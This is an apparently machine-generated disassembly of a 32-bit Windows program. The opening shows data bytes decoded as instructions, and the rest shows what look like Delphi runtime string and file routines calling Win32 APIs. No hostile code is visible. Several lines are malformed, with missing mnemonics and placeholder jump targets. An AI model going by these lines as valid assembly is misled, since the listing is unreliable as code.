add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx + 0x40 ] bh
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x40 ] ch
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or eax 0x72615645
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or al [ ebp + 0x50 ]
jb r-xdata
mov eax 0x4078
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
shr [ ecx + edi * 2 + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
jpe r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
clc
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jpe r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
or [ ebp + 0x4f ] al
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x100040 ] al
add [ eax ] al
clc
jo r-xdata
inc eax
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax + 0x4400407b ] dl
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
xchg esp eax
adc [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
sbb [ ecx ] dh
inc eax
add [ esi ] cl
test [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
fwait
push esi
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d2b4
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
xor eax [ eax ]
test [ ebx ] dh
inc eax
add [ eax + 0x33 ] bh
insb
jae r-xdata
js r-xdata
push ebp
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al [ ebp + 0x53 ]
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add ah bl
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ edx + 0x40 ]
inc ebp
jb r-xdata
adc [ ebp + 0x41 ] al
jae r-xdata
sub [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d15c
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ edi + ecx * 8 ] ch
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ eax ] 0x7b
inc eax
add [ ecx ] dl
add ebp [ esi ]
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edx ] dl
inc ebp
push ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407be43f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jl r-xdata
jb r-xdata
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add ah bl
xor [ eax ] al
sub al 0xcf
je r-xdata
aam 0xe9
add [ eax + 0x70004010 ] dh
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
nop
jpo r-xdata
imul ebp [ edi + 0x6e ] 0x407af490
adc [ ecx + 0x48b13415 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
add ah bl
xor [ eax ] al
rcl al 0x1
inc eax
add [ esp + edx * 2 ] ah
add [ eax ] al
jl r-xdata
xor eax [ eax ]
jl r-xdata
add eax 0xffffffd4
jmp sub_40d248
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
je r-xdata
dec ebp
jne r-xdata
add al dl
rol [ eax ] 0x1
and al 0x54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] ch
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x33700040 ] ah
inc eax
add [ eax + ebx * 2 ] dh
inc eax
add [ eax + 0x58 ] al
inc eax
add [ ebx + esi + 0x33780040 ] al
inc eax
add [ eax + 0x58 ] dl
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
sar bh 0xff
test eax 0xf08bffff
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b34
mov eax esi
pop esi
pop ebx
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
retn
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ ebx + 0x48c0a815 ] cl
add [ ebx + 0xa890448 ] cl
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
xor al 0xb1
dec eax
add [ ebx + 0x34158910 ] cl
mov cl 0x48
arpl [ eax + 0x72 ] bp
outsd
sub_407c94
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407cb0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8f4
call sub_4038f4
pop edi
pop esi
pop ebx
retn
sub_407cd4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4026cc
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402b34
mov eax esi
pop esi
pop ebx
retn
sub_407cf4
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4026ec
call ebx
pop ebx
retn
sub_407d20
push ebx
mov ebx eax
mov eax 0xc
call sub_4026cc
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407cf4
pop ebx
retn
sub_407d58
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404178
mov ebx eax
mov eax edi
mov edx ebx
call sub_404504
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407d94
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404178
mov ebx eax
mov eax edi
mov edx ebx
call sub_404504
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407dd0
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407e00
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407e20
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407e74
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407e20
test eax eax
jne r-xdata
sub_407e98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404178
mov ebx eax
mov eax esi
call sub_404378
mov edx eax
mov eax edi
mov ecx ebx
call sub_403fa8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_407ecc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404178
mov ebx eax
mov eax esi
call sub_404378
mov edx eax
mov eax edi
mov ecx ebx
call sub_403fa8
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_407f00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404178
push eax
mov eax esi
call sub_404378
push eax
mov eax ebx
call sub_404178
push eax
mov eax ebx
call sub_404378
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404178
push eax
mov eax esi
call sub_404378
push eax
mov eax ebx
call sub_404178
push eax
mov eax ebx
call sub_404378
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_407f88
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_407fa8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404178
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403eb8
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4043d8
pop ebp
pop edi
pop esi
pop ebx
retn
sub_407ff8
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404178
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404178
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_40805c
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_408072
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_408072
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408072
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4080a8
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_40805c
mov edx esi
pop eax
call sub_403fa8
add esp 0x10
pop esi
retn
sub_4080c8
or cl cl
jne sub_4080fc
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_4080fc
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_4080fc
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_4080fc
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408194
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4080c8
mov edx esi
pop eax
call sub_403fa8
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_4081bc
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_40805c
mov edx esi
pop eax
call sub_403fa8
add esp 0x20
pop esi
retn
xor edx edx
sub_4081e4
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b54
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407cb0
sub_408238
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402b54
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408258
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404cdc
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408278
mov eax [ rw-data ]
call sub_404f0c
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_404f0c
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c8
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f0c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4050c8
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_403f0c
sub_408308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_407f70
test al al
je r-xdata
sub_408344
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4096d4
mov edx eax
test dl dl
je r-xdata
call sub_408278
push ebp
mov eax [ rw-data ]
call sub_404f14
mov edx eax
mov eax [ rw-data ]
call sub_408308
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_404f14
mov edx eax
mov eax [ rw-data ]
call sub_408308
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_4083e0
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f0c
call sub_408278
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f0c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_403f0c
jmp r-xdata
pop esi
pop ebx
retn
sub_408430
push cs
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
sete al
add esp 0x400
pop esi
pop ebx
retn
popad
je r-xdata
inc eax
add al ch
scasb [ edi ]
retn
or [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
add [ eax ] al
mov eax eax
push ebx
push esi
add esp 0xfffffc00
mov esi eax
mov ebx edx
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx ]
push eax
push esi
call LoadStringA
mov ecx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_403fa8
cmp [ ebx + 0x4 ] 0x0
sub_408488
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404850
xor eax eax
push ebp
push sub_4084ee
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x4 ]
call sub_403eb8
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405614
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4084f5
lea eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_404920
retn
sub_408510
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_404378
push eax
call CreateFileA
sub_408568
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_404378
push eax
call CreateFileA
pop ebx
retn
sub_408594
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4085c0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4085ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_40862c
push ebp
mov ebp esp
add esp 0xfffffeb4
push ebx
mov ebx eax
lea eax [ ebp - 0x14c ]
push eax
mov eax ebx
call sub_404378
push eax
call FindFirstFileA
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call FindClose
test [ ebp - 0x14c ] 0x10
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x138 ]
push eax
call FileTimeToLocalFileTime
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call FileTimeToDosDateTime
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4086bc
push ebx
push esi
mov esi eax
mov eax esi
call sub_404178
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c1b8
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4086ec
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_404178
mov edi eax
mov eax ebx
call sub_404378
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4089f0
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c1b8
cmp al 0x2
jne r-xdata
dec edi
sub_40873c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4086ec
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_4043d8
pop edi
pop esi
pop ebx
retn
sub_408774
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4086ec
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_403eb8
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_4043d8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4087bc
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_404378
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_403fa8
add esp 0x108
pop esi
pop ebx
retn
sub_4087f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cb8
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404cb8
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_4088a8
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_4088d0
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_408904
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_404178
push eax
mov eax ebx
call sub_404378
